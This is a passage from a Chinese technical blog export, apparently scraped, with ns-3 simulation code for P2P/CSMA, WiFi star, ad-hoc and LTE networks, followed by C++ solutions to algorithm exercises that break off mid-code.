CsmaHelper csma;    csma.SetChannelAttribute (\"DataRate\", StringValue (\"100Mbps\"));   //数据率由channel属性指定，而非Device属性;    //因为CSMA不允许同一信道上有多个不同数据率的设备！    csma.SetChannelAttribute (\"Delay\", TimeValue (NanoSeconds (6560))); //speed-of-light delay???    NetDeviceContainer csmaDevices;    csmaDevices = csma.Install (csmaNodes);    //安装网络协议    InternetStackHelper stack;    stack.Install (p2pNodes.Get (0));     //P2P链路中的第一个节点    stack.Install (csmaNodes);            //P2P链路中的第二个节点包含在csmaNodes中    Ipv4AddressHelper address;                     //两个网段的IP地址类对象    address.SetBase (\"10.1.1.0\", \"255.255.255.0\"); //安排P2P网段的地址    Ipv4InterfaceContainer p2pInterfaces;    p2pInterfaces = address.Assign (p2pDevices);    address.SetBase (\"10.1.2.0\", \"255.255.255.0\"); //安排CSMA网段地址    Ipv4InterfaceContainer csmaInterfaces;    csmaInterfaces = address.Assign (csmaDevices);    /********************网络拓扑部分结束*********************/    /**********************应用程序部分*********************/    UdpEchoServerHelper echoServer (9);    ApplicationContainer serverApps = echoServer.Install (csmaNodes.Get (nCsma)); //将Server服务安装在CSMA网段的最后一个节点上，nCsma是可变的，所以不能用3    serverApps.Start (Seconds (1.0));    serverApps.Stop (Seconds (10.0));    UdpEchoClientHelper echoClient (csmaInterfaces.GetAddress (nCsma), 9);        //同first.cc    echoClient.SetAttribute (\"MaxPackets\", UintegerValue (1));    echoClient.SetAttribute (\"Interval\", TimeValue (Seconds (1.)));    echoClient.SetAttribute (\"PacketSize\", UintegerValue (1024));    ApplicationContainer clientApps = echoClient.Install (p2pNodes.Get (0));      //同first.cc    clientApps.Start (Seconds (2.0));    clientApps.Stop (Seconds (10.0));    /**********************应用程序部分结束*********************/    /****************调用全局路由Helper帮助建立网络路由*******************/    Ipv4GlobalRoutingHelper::PopulateRoutingTables (); //全局路由管理器根据节点产生的链路通告为每个节点建立路由表    /****************开启pcap跟踪*******************/    //pointToPoint.EnablePcapAll (\"second\");        //开启P2PHelper类对象的pcap;\"second\"为保存文件的前缀名，两句的名称相同了？？？    //前缀后的节点号是&lt;!全局节点号!&gt;，不用担心名称相同！    //csma.EnablePcap (\"second\", csmaDevices.Get (1), true); //开启csmaHelper类对象的pcap    //使用csma网段索引为1的设备(第二个)进行sniff，True开启Promiscuous mode    //NodeContainer类对象的Get方法用于获得容器中给定索引下的节点，返回指向请求节点的指针！    //Node类对象的GetId返回节点的全局ID(即节点列表中的索引号)？？？？？？？    //注意之前使用的Get是NetDevice类的方法，以下使用的是Node类的方法！！    //NetDevice不用取得ID，可以直接使用(已验证);但Node需要进一步查找ID!!（已验证，不使用GetId无法通过）    //所以后边的两句和这样的两句是等效的(已验证)    //  “csma.EnablePcap (\"second\", csmaDevices.Get (nCsma), 0);”    //  “csma.EnablePcap (\"second\", csmaDevices.Get (nCsma-1), 0);”    pointToPoint.EnablePcap (\"second\", p2pNodes.Get (0)-&gt;GetId (), 0);    //最后一项为explicitFilename，默认false，不加也可;若true，将prefix作为文件名    //倒数第二项promiscuous，默认false，此处仅想跟踪一个设备，故设为0(false);当有一个节点和设备的promiscuous模式设为true时，CSMA网段其它节点便不再产生trace文件。    csma.EnablePcap (\"second\", csmaNodes.Get (nCsma)-&gt;GetId (), 0, false);    csma.EnablePcap (\"second\", csmaNodes.Get (nCsma-1)-&gt;GetId (), 0, false);    Simulator::Run ();    Simulator::Destroy ();    return 0;&#125;\n\nthird.cc\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185// Default Network Topology // //   Wifi 10.1.3.0 //                 AP //  *    *    *    * //  |    |    |    |    10.1.1.0 // n5   n6   n7   n0 -------------- n1   n2   n3   n4 //                   point-to-point  |    |    |    | //                                   ================ //                                     LAN 10.1.2.0   #include \"ns3/core-module.h\" #include \"ns3/point-to-point-module.h\" #include \"ns3/network-module.h\" #include \"ns3/applications-module.h\" #include \"ns3/wifi-module.h\" #include \"ns3/mobility-module.h\" #include \"ns3/csma-module.h\" #include \"ns3/internet-module.h\"  using namespace ns3; // 声明了一个叫 ThirdScriptExample 的日志构件，可以实现打开或者关闭控制台日志的输出。 NS_LOG_COMPONENT_DEFINE (\"ThirdScriptExample\");int main (int argc, char *argv[])&#123;    // 定义变量，用于决定是否开启两个 UdpApplication 的 Logging 组件；默认 true 开启    bool verbose = true;    uint32_t nCsma = 3;    uint32_t nWifi = 3;    bool tracing = false;    CommandLine cmd;       cmd.AddValue (\"nCsma\", \"Number of \\\"extra\\\" CSMA nodes/devices\", nCsma);    cmd.AddValue (\"nWifi\", \"Number of wifi STA devices\", nWifi);    cmd.AddValue (\"verbose\", \"Tell echo applications to log if true\", verbose);    cmd.AddValue (\"tracing\", \"Enable pcap tracing\", tracing);    cmd.Parse (argc,argv);    if (nWifi &gt; 18)    &#123;        std::cout &lt;&lt; \"Number of wifi nodes \" &lt;&lt; nWifi &lt;&lt;        \" specified exceeds the mobility bounding box\" &lt;&lt; std::endl;        exit (1);    &#125;    if (verbose)    &#123;        LogComponentEnable (\"UdpEchoClientApplication\", LOG_LEVEL_INFO);        LogComponentEnable (\"UdpEchoServerApplication\", LOG_LEVEL_INFO);    &#125;        /******************** 网络拓扑部分 ************************/    // 创建使用 P2P 链路链接的 2 个节点    NodeContainer p2pNodes;    p2pNodes.Create (2);    // 设置传送速率和信道延迟    PointToPointHelper pointToPoint;    pointToPoint.SetDeviceAttribute (\"DataRate\", StringValue (\"5Mbps\"));    pointToPoint.SetChannelAttribute (\"Delay\", StringValue (\"2ms\"));    // 安装 P2P 网卡设备到 P2P 网络节点    NetDeviceContainer p2pDevices;    p2pDevices = pointToPoint.Install (p2pNodes);    // 创建 NodeContainer 类对象，用于总线 (CSMA) 网络    NodeContainer csmaNodes;    // 将第二个 P2P 节点添加到 CSMA 的 NodeContainer    csmaNodes.Add (p2pNodes.Get (1));    // 创建 Bus network 上另外 3 个 node    csmaNodes.Create (nCsma);    // 创建和连接 CSMA 设备及信道    CsmaHelper csma;    csma.SetChannelAttribute (\"DataRate\", StringValue (\"100Mbps\"));    csma.SetChannelAttribute (\"Delay\", TimeValue (NanoSeconds (6560)));            // 安装网卡设备到 CSMA 信道的网络节点    NetDeviceContainer csmaDevices;    csmaDevices = csma.Install (csmaNodes);            // 创建 NodeContainer 类对象，用于 WiFi 网络    NodeContainer wifiStaNodes;    wifiStaNodes.Create (nWifi);            // 设置 WiFi 网络的第一个节点为 AP    NodeContainer wifiApNode = p2pNodes.Get (0);        // 初始化物理信道    YansWifiChannelHelper channel = YansWifiChannelHelper::Default ();    YansWifiPhyHelper phy = YansWifiPhyHelper::Default ();    phy.SetChannel (channel.Create ());    WifiHelper wifi;    wifi.SetRemoteStationManager (\"ns3::AarfWifiManager\");            //Mac 层设置    NqosWifiMacHelper mac;    Ssid ssid = Ssid (\"ns-3-ssid\");    mac.SetType (\"ns3::StaWifiMac\",                                \"Ssid\", SsidValue (ssid),                                \"ActiveProbing\", BooleanValue (false));            // 安装网卡设备到 WiFi 信道的网络节点，并配置参数    NetDeviceContainer staDevices;    staDevices = wifi.Install (phy, mac, wifiStaNodes);    mac.SetType (\"ns3::ApWifiMac\",                                \"Ssid\", SsidValue (ssid));    //安装网卡设备到 WiFi 信道的 AP 节点，并配置参数    NetDeviceContainer apDevices;    apDevices = wifi.Install (phy, mac, wifiApNode);    // 添加移动模型    MobilityHelper mobility;    mobility.SetPositionAllocator (\"ns3::GridPositionAllocator\",                                    \"MinX\", DoubleValue (0.0),                                                                      \"MinY\", DoubleValue (0.0),                                                                      \"DeltaX\", DoubleValue (5.0),                                                                      \"DeltaY\", DoubleValue (10.0),                                                                      \"GridWidth\", UintegerValue (3),                                                                      \"LayoutType\", StringValue (\"RowFirst\"));    mobility.SetMobilityModel (\"ns3::RandomWalk2dMobilityModel\",                                                              \"Bounds\", RectangleValue (Rectangle (-50, 50, -50, 50)));    // 在 STA 节点上安装移动模型    mobility.Install (wifiStaNodes);            // 设置 AP：固定在一个位置上    mobility.SetMobilityModel (\"ns3::ConstantPositionMobilityModel\");    mobility.Install (wifiApNode);    // 安装网络协议    InternetStackHelper stack;    stack.Install (csmaNodes);    stack.Install (wifiApNode);    stack.Install (wifiStaNodes);    Ipv4AddressHelper address;            // 安排 P2P 网段的地址    address.SetBase (\"10.1.1.0\", \"255.255.255.0\");    Ipv4InterfaceContainer p2pInterfaces;    p2pInterfaces = address.Assign (p2pDevices);    // 安排 csma 网段的地址    address.SetBase (\"10.1.2.0\", \"255.255.255.0\");    Ipv4InterfaceContainer csmaInterfaces;    csmaInterfaces = address.Assign (csmaDevices);            // 安排 wifi 网段的地址    address.SetBase (\"10.1.3.0\", \"255.255.255.0\");    address.Assign (staDevices);    address.Assign (apDevices);    /******************** 网络拓扑部分结束 *********************/            /********************** 应用程序部分 *********************/    UdpEchoServerHelper echoServer (9);            // 将 Server 服务安装在 CSMA 网段的最后一个节点上    ApplicationContainer serverApps = echoServer.Install (csmaNodes.Get (nCsma));    serverApps.Start (Seconds (1.0));    serverApps.Stop (Seconds (10.0));            UdpEchoClientHelper echoClient (csmaInterfaces.GetAddress (nCsma), 9);    echoClient.SetAttribute (\"MaxPackets\", UintegerValue (1));    echoClient.SetAttribute (\"Interval\", TimeValue (Seconds (1.0)));    echoClient.SetAttribute (\"PacketSize\", UintegerValue (1024));            // 将 Client 应用安装在 WiFi 网段的倒数第二个节点上    ApplicationContainer clientApps =echoClient.Install (wifiStaNodes.Get (nWifi - 1));       clientApps.Start (Seconds (2.0));    clientApps.Stop (Seconds (10.0));            /**************** 调用全局路由 Helper 帮助建立网络路由 *******************/   Ipv4GlobalRoutingHelper::PopulateRoutingTables ();    Simulator::Stop (Seconds (10.0));    /**************** 开启 pcap 跟踪 *******************/    pointToPoint.EnablePcapAll (\"third\");    phy.EnablePcap (\"third\", apDevices.Get (0));    csma.EnablePcap (\"third\", csmaDevices.Get (0), true);            Simulator::Run ();    Simulator::Destroy ();    return 0;&#125;\n\n一、部署一个星型无线网络（一个AP，不少于5个接入点）代码思路：\n默认建立一个AP结点和5个接入点，其中接入点的个数也可在运行时通过command传入，进行自定义。将AP的移动模型设置为静止状态，其他接入点可自由移动。\n具体流程：创建NodeContainer 类对象-&gt;初始化物理信道-&gt;Mac 层设置-&gt;安装网卡设备-&gt;添加移动模型-&gt;安装网络协议-&gt;安排网段的地址-&gt;安装Server 服务到指定节点-&gt;配置应用程序客户端并安装到指定节点-&gt;调用全局路由 Helper 帮助建立网络路由-&gt;开启仿真器运行。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155// Default Network Topology // //   Wifi 10.1.3.0 //                           AP //  *    *    *    *    *    *//  |    |    |    |    |    |// n0   n4   n3   n2   n1   n5//#include \"ns3/core-module.h\" #include \"ns3/network-module.h\" #include \"ns3/applications-module.h\" #include \"ns3/wifi-module.h\" #include \"ns3/mobility-module.h\" #include \"ns3/internet-module.h\" using namespace ns3;// 声明了一个叫 StarWirelessNet 的日志构件，可以实现打开或者关闭控制台日志的输出。 NS_LOG_COMPONENT_DEFINE (\"StarWirelessNet\");int main (int argc, char *argv[])&#123;    // 定义变量，用于决定是否开启两个 UdpApplication 的 Logging 组件；默认 true 开启    bool verbose = true;    uint32_t nWifi = 5;    bool tracing = false;    CommandLine cmd;    cmd.AddValue (\"nWifi\", \"Number of wifi STA devices\", nWifi);    cmd.AddValue (\"verbose\", \"Tell echo applications to log if true\", verbose);    cmd.AddValue (\"tracing\", \"Enable pcap tracing\", tracing);    cmd.Parse (argc,argv);    if (nWifi &gt; 18)    &#123;        std::cout &lt;&lt; \"Number of wifi nodes \" &lt;&lt; nWifi &lt;&lt;        \" specified exceeds the mobility bounding box\" &lt;&lt; std::endl;        exit (1);    &#125;    if (verbose)    &#123;        LogComponentEnable (\"UdpEchoClientApplication\", LOG_LEVEL_INFO);        LogComponentEnable (\"UdpEchoServerApplication\", LOG_LEVEL_INFO);    &#125;    // 创建 NodeContainer 类对象，用于 WiFi 网络    NodeContainer wifiStaNodes;    wifiStaNodes.Create (nWifi);    // 创建一个 WiFi 网络的AP    NodeContainer wifiApNode;    wifiApNode.Create (1);        // 初始化物理信道    YansWifiChannelHelper channel = YansWifiChannelHelper::Default ();    YansWifiPhyHelper phy = YansWifiPhyHelper::Default ();    phy.SetChannel (channel.Create ());    WifiHelper wifi;    wifi.SetRemoteStationManager (\"ns3::AarfWifiManager\");    //Mac 层设置,Service Set Identifier将一个无线局域网分为几个需要不同身份验证的子网络    WifiMacHelper mac;    Ssid ssid = Ssid (\"ns-3-ssid\");    mac.SetType (\"ns3::StaWifiMac\",               \"Ssid\", SsidValue (ssid),               \"ActiveProbing\", BooleanValue (false));            // 安装网卡设备到 WiFi 信道的sta节点，并配置参数    NetDeviceContainer staDevices;    staDevices = wifi.Install (phy, mac, wifiStaNodes);    mac.SetType (\"ns3::ApWifiMac\",                \"Ssid\", SsidValue (ssid));    //安装网卡设备到 WiFi 信道的 AP 节点，并配置参数    NetDeviceContainer apDevices;    apDevices = wifi.Install (phy, mac, wifiApNode);    // 添加移动模型    MobilityHelper mobility;    //GridWidth:一行最多有几个节点    //DeltaX:x轴上节点间的距离    //DeltaY:y轴上节点间的距离    mobility.SetPositionAllocator (\"ns3::GridPositionAllocator\",                                    \"MinX\", DoubleValue (0.0),                                    \"MinY\", DoubleValue (0.0),                                    \"DeltaX\", DoubleValue (10.0),                                    \"DeltaY\", DoubleValue (15.0),                                    \"GridWidth\", UintegerValue (3),                                    \"LayoutType\", StringValue (\"RowFirst\"));    //在一个2d场景随机运动，方向和速度都是随机的    //Bounds:运动的范围    mobility.SetMobilityModel (\"ns3::RandomWalk2dMobilityModel\",                                \"Bounds\", RectangleValue (Rectangle (-50, 50, -50, 50)));    // 在 STA 节点上安装移动模型    mobility.Install (wifiStaNodes);        // 设置 AP：固定在一个位置上    mobility.SetMobilityModel (\"ns3::ConstantPositionMobilityModel\");    mobility.Install (wifiApNode);    // 安装网络协议    InternetStackHelper stack;    stack.Install (wifiApNode);    stack.Install (wifiStaNodes);    Ipv4AddressHelper address;    // 安排 wifi 网段的地址    address.SetBase (\"10.1.1.0\", \"255.255.255.0\");    Ipv4InterfaceContainer wifiInterfaces;    address.Assign (staDevices);    wifiInterfaces = address.Assign (apDevices);    /******************** 网络拓扑部分结束 *********************/    /********************** 应用程序部分 *********************/    UdpEchoServerHelper echoServer (9);    // 将 Server 服务安装在 AP节点上    ApplicationContainer serverApps = echoServer.Install (wifiApNode);    serverApps.Start (Seconds (1.0));    serverApps.Stop (Seconds (10.0));    //配置应用程序客户端，wifiInterfaces.GetAddress (0)获取服务器节点的ip地址，以及服务器端口号9    UdpEchoClientHelper echoClient (wifiInterfaces.GetAddress (0), 9);    //此外还需配置客户端属性，例如包的大小和长度以及发包间隔    echoClient.SetAttribute (\"MaxPackets\", UintegerValue (1));    echoClient.SetAttribute (\"Interval\", TimeValue (Seconds (1.0)));    echoClient.SetAttribute (\"PacketSize\", UintegerValue (1024));    //将客户端功能加载到一个sta节点上，同样需要配置客户端开始和结束时间    ApplicationContainer clientApps = echoClient.Install (wifiStaNodes.Get (nWifi - 1));    clientApps.Start (Seconds (2.0));    clientApps.Stop (Seconds (10.0));    /**************** 调用全局路由 Helper 帮助建立网络路由 *******************/    Ipv4GlobalRoutingHelper::PopulateRoutingTables ();    Simulator::Stop (Seconds (10.0));    /**************** 开启 pcap 跟踪 *******************/    if (tracing == true)    &#123;      phy.EnablePcap (\"star\", apDevices.Get (0));    &#125;    //开启仿真器运行    Simulator::Run ();    Simulator::Destroy ();    return 0;&#125;\n\n运行结果：\n\n图形界面：\n要显示图形界面，在运行命令后面加--vis\n\n\n二、部署多跳无线网络（不少于6个网络节点）代码思路：\n创建6个网络节点作为多跳无线网络的节点，使用on-off类控制发给node0的9999端口，并一直处于发送状态，安装到node5上；安装packetSink类到node0，用来接收和消耗到9999端口的流量。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124/* -*- Mode:C++; c-file-style:\"gnu\"; indent-tabs-mode:nil; -*- *//* * This program is free software; you can redistribute it and/or modify * it under the terms of the GNU General Public License version 2 as * published by the Free Software Foundation; * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the * GNU General Public License for more details. *  * You should have received a copy of the GNU General Public License * along with this program; if not, write to the Free Software * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA */#include \"ns3/core-module.h\"#include \"ns3/network-module.h\"#include \"ns3/applications-module.h\"#include \"ns3/wifi-module.h\"#include \"ns3/mobility-module.h\"#include \"ns3/internet-module.h\"using namespace ns3;// 声明了一个叫 AdHocExample 的日志构件，可以实现打开或者关闭控制台日志的输出。 NS_LOG_COMPONENT_DEFINE (\"AdHocExample\");intmain(int argc,char *argv[])&#123;    Time::SetResolution (Time::NS);    LogComponentEnable (\"AdHocExample\", LOG_LEVEL_INFO);    // LogComponentEnable (\"TcpL4Protocol\", LOG_LEVEL_INFO);    LogComponentEnable (\"PacketSink\", LOG_LEVEL_ALL);    uint32_t nAdHoc=6;    CommandLine cmd;    cmd.AddValue (\"nAdHoc\", \"Number of wifi ad devices\", nAdHoc);        cmd.Parse (argc,argv);        // 创建 NodeContainer 类对象    NodeContainer AdHocNode;    AdHocNode.Create(nAdHoc);        // 初始化物理信道    YansWifiChannelHelper channel = YansWifiChannelHelper::Default ();    YansWifiPhyHelper phy = YansWifiPhyHelper::Default ();    phy.SetChannel (channel.Create ());        WifiHelper wifi;    wifi.SetStandard(WIFI_PHY_STANDARD_80211a); //设置标准    wifi.SetRemoteStationManager(\"ns3::ConstantRateWifiManager\",\"DataMode\",StringValue(\"OfdmRate6Mbps\"));    //Mac 层设置    WifiMacHelper mac;    mac.SetType (\"ns3::AdhocWifiMac\",                    \"Slot\", StringValue (\"16us\"));    // 安装网卡设备    NetDeviceContainer AdHocDevices;    AdHocDevices = wifi.Install(phy,mac,AdHocNode);        // 添加移动模型    MobilityHelper mobility;    mobility.SetPositionAllocator (\"ns3::GridPositionAllocator\",                                        \"MinX\", DoubleValue (0.0),                                        \"MinY\", DoubleValue (0.0),                                        \"DeltaX\", DoubleValue (10.0),                                        \"DeltaY\", DoubleValue (15.0),                                        \"GridWidth\", UintegerValue (4),                                        \"LayoutType\", StringValue (\"RowFirst\"));    mobility.SetMobilityModel (\"ns3::RandomWalk2dMobilityModel\",                                \"Bounds\", RectangleValue (Rectangle (-50, 50, -50, 50)));    // 在 AdHoc 节点上安装移动模型    mobility.Install (AdHocNode);        // 安装网络协议    InternetStackHelper Internet;    Internet.Install(AdHocNode);        // 安排网段的地址    Ipv4AddressHelper address;    address.SetBase(\"195.1.1.0\",\"255.255.255.0\");        Ipv4InterfaceContainer AdHocIp;    AdHocIp = address.Assign(AdHocDevices);    /******************** 网络拓扑部分结束 *********************/        /********************** 应用程序部分 *********************/    NS_LOG_INFO (\"Create Applications.\");    uint16_t port = 9999;    OnOffHelper onOff1(\"ns3::TcpSocketFactory\",Address(InetSocketAddress(AdHocIp.GetAddress(0),port)));    //m_onTime和 m_offTime分别为发送持续的时间和不发送持续的时间    //这里的写法表示一直处于发送状态    onOff1.SetAttribute (\"OnTime\", StringValue (\"ns3::ConstantRandomVariable[Constant=1]\"));    onOff1.SetAttribute (\"OffTime\", StringValue (\"ns3::ConstantRandomVariable[Constant=0]\"));        ApplicationContainer apps1 = onOff1.Install(AdHocNode);    apps1.Start(Seconds(2.0));    apps1.Stop(Seconds(10.0));        //packetSink是一个对于on-off application的补充类，它可以接收和消耗到某一个地址和端口的流量    //第一个参数选定用于创建套接字的factory类型，绑定接收端的IP地址和端口    //Ipv4Address::GetAny ()返回主机的所有IP地址    //将PacketSinkApplication安装到 node0    PacketSinkHelper sinkHelper (\"ns3::TcpSocketFactory\", Address(InetSocketAddress (Ipv4Address::GetAny(), port)));    ApplicationContainer apps2 = sinkHelper.Install(AdHocNode.Get(0));        apps2.Start(Seconds(0.0));    apps2.Stop(Seconds(10.0));        /**************** 调用全局路由 Helper 帮助建立网络路由 *******************/    Ipv4GlobalRoutingHelper::PopulateRoutingTables ();        //开启仿真器运行     Simulator::Stop(Seconds(10.0));    Simulator::Run();    Simulator::Destroy();    return 0;&#125;\n\n仿真结果：\n\n\n三、利用NS3部署一个LTE网络LTE 网络的网络节点之间的接口和协议：\n\nE-UTRAN 的系统结构：\n\neNB 简单说就是代表基站，是 UE (用户) 与核心网之间的桥梁；eNB 之间由 X2 接口互连，每个 eNB 又和演进型分组核心网 EPC 通过 S1 接口相连。S1 接口的用户面终止在服务网关 S-GW 上，S1 接口的控制面终止在移动性管理实体 MME 上。控制面和用户面的另一端终止在 eNB 上。\nEPC 网络架构:\nEPC 的网元主要包括 MME，SGW，PGW。因此相应的 EPC 协议也是围绕这三个网元之间的接口来展开的。他们之间的接口协议如图所示:\n\nMME（Mobility Management Entity)：是移动管理实体，是一个用于信令控制的网元，主要用作移动性的管理。\nS-GW (Serving Gateway)：核心网的服务网关，是数据面的网元，数据面可以理解为数据传输的处理通道，负责本地网络用户数据处理。\nP-GW (PDN Gateway)：PDN（Public Data Network）公共数据网，充当外部数据连接的边界。\n小区：一个基站覆盖的范围就叫小区，每个小区都有独立的小区号。\n扇区：通常一个基站分为三个扇区，每个扇区打向一个方向，每个扇区覆盖 120 度的范围。所朝向的那个扇区，有一个编号，叫 CI 号。同一个基站下的 CI 号的个位数是连续的，各位数一般是 1、2、3。\n【实验内容】：\n利用利用NS3部署一个LTE网络，具体参数如表所示\n\n绘制仿真的Radio Environment Map。\n【代码思路】：以lena-dual-stripe.cc为基础，本文主要介绍基于lena-dual-stripe.cc的参数修改\n1)   基站距离设置为500m\n1static ns3::GlobalValue g_interSiteDistance (\"interSiteDistance\", \"min distance between two nearby macro cell sites\", ns3::DoubleValue (500), ns3::MakeDoubleChecker&lt;double&gt; ());\n\n2)   基站发射功率(46dBm)\n1static ns3::GlobalValue g_macroEnbTxPowerDbm (\"macroEnbTxPowerDbm\", \"TX power [dBm] used by macro eNBs\", ns3::DoubleValue (46.0), ns3::MakeDoubleChecker&lt;double&gt; ());\n\n3)   天线波束宽度(70°)\n1lteHelper-&gt;SetEnbAntennaModelAttribute (\"Beamwidth\",DoubleValue (70));\n\n4)   天线最大衰减（25.0） \n1lteHelper-&gt;SetEnbAntennaModelAttribute (\"MaxAttenuation\", DoubleValue (25.0));\n\n5)   系统带宽(20MHz)\n123static ns3::GlobalValue g_homeEnbBandwidth (\"homeEnbBandwidth\",\"bandwidth [num RBs] used by HeNBs\",ns3::UintegerValue (20),                ns3::MakeUintegerChecker&lt;uint16_t&gt; ());\n\n6)   路径损耗模型\n1lteHelper-&gt;SetAttribute (\"\", StringValue (\"ns3::HybridBuildingsPropagationLossModel\"));\n\n7)   用户设备高度(1.5)\nZ轴设置为1.5，设备高度即为1.5。\n1234remHelper-&gt;SetAttribute (\"XMin\", DoubleValue (macroUeBox.xMin)); remHelper-&gt;SetAttribute (\"XMax\", DoubleValue (macroUeBox.xMax));remHelper-&gt;SetAttribute (\"YMin\", DoubleValue (macroUeBox.yMin));remHelper-&gt;SetAttribute (\"YMax\", DoubleValue (macroUeBox.yMax));remHelper-&gt;SetAttribute (\"Z\", DoubleValue (1.5));\n\n【运行程序】：\n1)   命令语句\n1234.&#x2F;waf --run&#x3D;&quot;lena-dual-stripe--generateRem&#x3D;1 --nMacroEnbSites&#x3D;7 --nMacroEnbSitesX&#x3D;2 --ns3::RadioBearerStatsCalculator::DlRlcOutputFilename&#x3D;a3-rsrp-DlRlcStats.txt--ns3::RadioBearerStatsCalculator::UlRlcOutputFilename&#x3D;a3-rsrp-UlRlcStats.txt&quot;\n\n其中nMacroEnbSites=7表示宏小区站点数量为7，nMacroEnbSitesX=2表示各站点以2-3-2的方式排列。\n2)   画图脚本\n123456set view map;set xlabel \"X\"set ylabel \"Y\"set cblabel \"SINR (dB)\"unset keyplot \"lena-dual-stripe.rem\" using ($1):($2):(10*log10($4)) with image\n\n脚本命名为plot_script.\n3)   仿真图\n输入命令gnuplot -p enbs.txt ues.txt buildings.txt plot_script得到仿真的Radio Environment Map\n\n","thumbnail":"https://i.loli.net/2020/11/13/xFtCvg2yAOqINRz.jpg","plink":"https://yuyuoo.github.io/2020/11/13/利用NS3部署不同拓扑无线网络/"},{"title":"算法笔记之《算法笔记》","date":"2020-09-04T03:04:14.000Z","date_formatted":{"ll":"Sep 4, 2020","L":"09/04/2020","MM-DD":"09-04"},"updated":"2020-09-06T08:24:22.511Z","content":"贪心-RecoverTheSmallestNumber《上机训练》p.162\n题意：\n\n给出若干可能有前导零的数字串，将它们按某个顺序拼接，使生成的数最小。\n\n样例输入\n\n5 32 321 3214 0229 87\n\n样例输出\n\n22932132143287\n\n样例解释\n\n将数字串按0229、321、3214、32、87的顺序拼接，使生成的数最小\n\n思路\n\n对所有的数字串S1与S2，如果有S1+S2&lt;S2+S1（拼接），就把S1放在S2前面。\n直接使用string的加号进行字符串拼接，比较过程直接写一个cmp函数，调用sort()。\n\n1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;algorithm&gt;using namespace std;#define MAXN 10005string str[MAXN];bool cmp(string a,string b)&#123;    return a + b &lt; b + a;   //如果a+b&lt;b+a，就把a排在前面&#125;int main()&#123;    int n;    cin &gt;&gt; n;    for(int i = 0;i &lt; n;i++)        cin &gt;&gt; str[i];    sort(str, str+n, cmp);  //排序    string ans; //结果字符串    for(int i = 0;i &lt; n;i++)        ans += str[i];    while(ans.size() != 0 &amp;&amp; ans[0] == '0')        ans.erase(ans.begin()); //去除前导零    if(ans.size() == 0) cout &lt;&lt; 0;  //去除前导零后没了，输出0    else cout &lt;&lt; ans;    return 0;&#125;\n\n完美数列（1）二分法《上机训练》p.165\n题意：\n\n第一行给出N,p的值，从N个正整数中选择若干个数，使得选出的这些数中的最大值不超过最小值的p倍\n\n样例输入\n\n10 8\n2 3 20 4 5 1 6 7 8 9\n\n样例输出\n\n8\n\n样例解释\n\n最多选出8个数，2 3 4 5 6 7 8 9或者1 2 3 4 5 6 7 8\n\n思路\n\n先对n个数从小到大排序，再从第一个开始逐个遍历，以这个数为最小数，往后数从哪个数开始不符合最大数规则，记录 j-i+1 是本轮数的个数。\n在查找符合规则的最大数的时候，可以自己写函数用二分法查找，但可以直接用 upper_bound() 函数，upper_bound()函数返回的规定范围内大于指定值的第一个数的指针或者迭代器。\n\n参考代码\n12345678910111213141516171819202122232425#include &lt;cstdio&gt;#include &lt;algorithm&gt;using namespace std;#define MAXN 100005int n,p,a[MAXN];int main()&#123;    scanf(\"%d%d\",&amp;n,&amp;p);    for(int i = 0;i &lt; n;i++)    &#123;        scanf(\"%d\",&amp;a[i]);    &#125;    sort(a,a+n);    int ans = 1;    //最大长度，初值为1（表示至少有一个数）    for(int i = 0;i &lt; n;i++)    &#123;        //在a[i+1]~a[n-1]中查找第一个超过a[i]*p的数，返回其位置给j        int j = upper_bound(a + i + 1,a + n,(long long)a[i] * p) - a;        ans = max(ans,j - i);    &#125;    printf(\"%d\\n\", ans);    return 0;&#125;\n\n（2）two pointers思路\n\n指针 i 在前面，j 在后面，控制 j 指向从 i 开始第一个不满足条件的位置。不断让 i 右移，再重新更新 j 应在的位置，知道 i 右移到最后一位，利用count记录全过程中 j 和 i 距离最大的时候。\n\n参考代码\n123456789101112131415161718192021222324252627#include &lt;cstdio&gt;#include &lt;algorithm&gt;using namespace std;#define MAXN 100005int main()&#123;    int n,p,a[MAXN];    scanf(\"%d%d\",&amp;n,&amp;p);    for(int i = 0;i &lt; n;i++)    &#123;        scanf(\"%d\",&amp;a[i]);    &#125;    sort(a, a + n);    int i = 0,j = 0,count = 1;    while(i &lt; n &amp;&amp; j &lt; n)    &#123;        //j不断右移，直到恰好不满足条件        while(j &lt; n &amp;&amp; a[j] &lt;= (long long)a[i] * p)        &#123;            count = max(count,j - i + 1);            j++;        &#125;        i++;    //i右移一位    &#125;    printf(\"%d\\n\",count);    return 0;&#125;\n\n并查集-SocialClusters《上机训练》p.330\n题意：\n\n有N个人，每个人喜欢若干项活动，如果两个人有任意一个活动相同，那么就称他们属于同一个社交网络（如果A和B属于同一个，B和C属于同一个，则ABC属于同一个）。求这N个人共形成了多少个社交网络\n\n样例输入\n\n8  \n3:2 7 101:42:5 31:41:31:44:6 8 1 51:4\n\n样例输出\n\n3  \n4 3 1\n\n样例解释\n\n3个社交网络，每个网络按人数从大到小为4人，3人，1人\n\n思路\n\ncourse[h]记录第一个喜欢活动h的人的编号，findFather(course[h]) 是这个人所在的社交网络的根结点。对当前读入的人的编号 i 和他喜欢的每个活动h，需要合并 i 与 findFather(course[h])。isRoot[x] 指以 x 号人作为根结点的社交网络中有多少人，如果x不是根结点，isRoot[x]就是0。\n并查集在Union两个点的时候要路径压缩。\n\n参考代码\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;cstdio&gt;#include &lt;algorithm&gt;#define N 1005using namespace std;int father[N];  //存放父亲结点int isRoot[N] = &#123;0&#125;;    